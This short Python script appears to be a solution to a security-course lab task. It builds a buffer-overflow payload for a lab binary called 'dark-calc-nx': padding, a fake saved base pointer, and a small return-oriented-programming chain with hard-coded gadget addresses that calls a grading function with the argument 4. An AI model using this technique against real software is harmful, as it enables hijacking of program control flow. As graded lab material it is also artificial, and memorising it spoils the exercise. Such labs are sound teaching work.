#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
from struct import pack

expression = b"A" * 15 + b"\x00"
fake_rbp = b"B" * 8
pop_rdi_ret = pack("<Q", 0x401A33)
grade = pack("<Q", 4)
grade_eval = pack("<Q", 0x401978)
payload = expression + fake_rbp + pop_rdi_ret + grade + grade_eval

sys.stdout.buffer.write(payload)
